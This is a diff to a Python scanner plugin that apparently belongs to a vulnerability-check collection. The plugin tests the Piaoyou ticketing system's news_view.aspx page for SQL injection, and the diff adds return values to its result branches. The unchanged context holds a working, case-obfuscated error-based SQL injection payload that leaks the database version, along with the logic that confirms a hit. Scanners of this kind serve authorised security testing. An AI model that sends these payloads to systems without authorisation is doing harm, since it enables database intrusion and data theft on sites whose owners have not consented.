@@ -26,16 +26,19 @@ class piaoyou_newsview_list_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
                 cprint("[+]存在票友票务系统通用sql注入漏洞...(高危)\tpayload: "+vulnurl, "red")
-
+                return True, vulnurl, "票友票务系统通用sql注入", payload, req.text
             vulnurl = self.url + "/news_view.aspx?id=1Or/**/1=CoNvErT(InT,(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN))--"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
                 cprint("[+]存在票友票务系统通用sql注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "票友票务系统通用sql注入", payload, req.text
             else:
                 cprint("[-]不存在piaoyou_newsview_list漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
